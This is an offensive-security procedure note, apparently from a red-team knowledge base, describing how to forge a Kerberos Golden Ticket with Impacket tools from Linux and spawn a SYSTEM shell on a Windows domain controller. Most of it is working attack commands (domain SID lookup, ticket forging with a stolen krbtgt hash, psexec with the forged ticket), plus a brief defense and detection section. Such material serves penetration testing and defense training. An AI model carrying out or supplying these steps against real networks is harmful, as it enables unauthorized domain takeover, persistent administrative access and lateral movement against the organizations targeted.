---
id: 3472aad0-5e6e-4bfa-94f2-ddd0b9627324
name: Create-Golden-Ticket-and-Launch-Windows-SYSTEM-Shell-from-Linux
type: procedure
verified: true
submitted: true
created_at: '2020-06-24T05:08:26.349092+00:00'
updated_at: '2023-05-25T19:43:47.435349+00:00'
tactics:
  - '[[Lateral Movement]]'
techniques:
  - '[[Pass the Ticket]]'
sub_techniques: []
tags:
  - active-directory
  - persistence
  - shell
commands:
  - '[[commands/lookupsid-get-domain-sid]]'
  - '[[commands/ticketer-create-golden-ticket]]'
  - '[[commands/export-krb5ccname-to-ccache-file]]'
  - '[[commands/net-time-sync-to-dc]]'
  - '[[commands/psexec-spawn-system-shell-with-ticket]]'
platforms:
  - Linux
  - Windows
tools: []
validated: true
---

# Create-Golden-Ticket-and-Launch-Windows-SYSTEM-Shell-from-Linux

## Summary

This procedure uses the domain's krbtgt NTLM hash, obtained from a domain controller, to forge a Golden Ticket for the Administrator user. The ticket is then used to authenticate and spawn a SYSTEM-level shell on a remote Windows domain controller via psexec.py from a Linux attacker machine. This enables persistent administrative access without valid credentials.

## Description

Golden Tickets exploit the Kerberos authentication protocol by forging a Ticket Granting Ticket (TGT) using the krbtgt account's NTLM hash, which is critical to domain trust. Once created, the ticket impersonates any domain user (here, Administrator) and bypasses normal authentication. The procedure assumes prior compromise of a domain controller to extract the krbtgt hash via tools like Mimikatz or secretsdump.py. It targets Active Directory environments, synchronizing time and updating hosts for proper Kerberos resolution before lateral movement. Success grants full domain admin privileges on the target system.

## Requirements

1. krbtgt NTLM hash from the domain controller (obtained via DCSync, LSA dump, or similar).
2. Domain SID, domain name, and domain controller IP/FQDN.
3. Valid low-privilege domain credentials for initial SID lookup.
4. Impacket suite installed on Linux (including lookupsid.py, ticketer.py, psexec.py).
5. Network access to the domain controller (ports 445/TCP for SMB, 88/TCP for Kerberos).
6. Local time synchronization to within 5 minutes of the domain (Kerberos requirement).

## Defense

Defensive measures and detection strategies:

- Monitor for anomalous Kerberos ticket requests, especially TGTs for krbtgt or unusual users (Event ID 4768/4769 in Windows logs).
- Implement krbtgt hash rotation every 6-12 months and monitor for DCSync abuse (Event ID 4662).
- Enable Protected Users group to limit ticket lifetimes and block delegation.
- Use network segmentation to restrict lateral movement and monitor SMB/Kerberos traffic with tools like Zeek or Windows Defender ATP.
- Deploy endpoint detection for Impacket tools via YARA rules or behavior analytics (e.g., unusual psexec service creation, Event ID 7045).

## Objectives

1. Forge a persistent Golden Ticket for domain Administrator impersonation.
2. Authenticate to the domain controller using the forged ticket.
3. Achieve SYSTEM-level remote code execution on the target Windows system.
4. Establish a stable shell for further post-exploitation.

## Instructions

### Step 1: Retrieve Domain SID

**Context**: Obtain the domain's Security Identifier (SID) using low-privilege credentials against the domain controller. This SID is required to construct the Golden Ticket structure.

**Command** ([[commands/lookupsid-get-domain-sid]]):
```bash
lookupsid.py '$_DOMAIN/$_USERNAME:$_PASSWORD'@$_TARGET_IP
```

> This command brute-forces the SID via LSARPC pipe. Replace $_DOMAIN with the target domain (e.g., bank.local), $_USERNAME/$_PASSWORD with valid credentials, and $_TARGET_IP with the DC IP. Expected output includes the full domain SID (e.g., S-1-5-21-...).

### Step 2: Forge Golden Ticket

**Context**: Use the krbtgt hash and domain SID to create a Kerberos TGT for the Administrator user, saved as a ccache file for subsequent use.

**Command** ([[commands/ticketer-create-golden-ticket]]):
```bash
ticketer.py -nthash $_NTLM_HASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN Administrator
```

> Provide the krbtgt NTLM hash in $_NTLM_HASH, the SID from Step 1 in $_DOMAIN_SID, and domain name in $_DOMAIN. The ticket is saved to Administrator.ccache. Success is indicated by messages about creating and encrypting the ticket.

### Step 3: Configure Kerberos Credential Cache

**Context**: Set the KRB5CCNAME environment variable to point to the generated ccache file, enabling Impacket tools to use the Golden Ticket for authentication.

**Command** ([[commands/export-krb5ccname-to-ccache-file]]):
```bash
export KRB5CCNAME="$(pwd)/Administrator.ccache"
```

> Run this in the current directory where the ccache file resides. Verify with `echo $KRB5CCNAME` showing the path. This persists for the session.

### Step 4: Update Hosts File for Resolution

**Context**: Ensure proper DNS resolution for the domain controller by adding an entry to /etc/hosts, mapping the DC IP to its FQDN and domain name. This prevents Kerberos failures due to name resolution issues.

Add the following line to /etc/hosts (requires sudo):
```bash
echo "$_DC_IP $_DC_FQDN $_DOMAIN" | sudo tee -a /etc/hosts
```

> Replace $_DC_IP (e.g., 10.10.10.5), $_DC_FQDN (e.g., dc01.bank.local), and $_DOMAIN (e.g., bank.local). Verify with `ping $_DC_FQDN` resolving to the correct IP.

### Step 5: Synchronize System Time

**Context**: Kerberos tickets are time-sensitive; sync the attacker's clock to the DC to avoid rejection due to skew (optional but recommended if time drift >5 minutes).

**Command** ([[commands/net-time-sync-to-dc]]):
```bash
net time set -S $_DC_IP
```

> This uses anonymous SMB to query and set time from the DC IP in $_DC_IP. Expected output confirms time adjustment.

### Step 6: Spawn SYSTEM Shell

**Context**: Use the Golden Ticket to authenticate as Administrator and execute psexec.py, which uploads and runs a service for a SYSTEM shell on the DC.

**Command** ([[commands/psexec-spawn-system-shell-with-ticket]]):
```bash
psexec.py Administrator@$_DC_NAME -k -no-pass -dc-ip $_DC_IP
```

> Specify the DC FQDN in $_DC_NAME and IP in $_DC_IP. The -k flag uses the ccache ticket, -no-pass skips password prompt. Success drops into a Windows command shell at C:\Windows\system32> as NT AUTHORITY\SYSTEM.
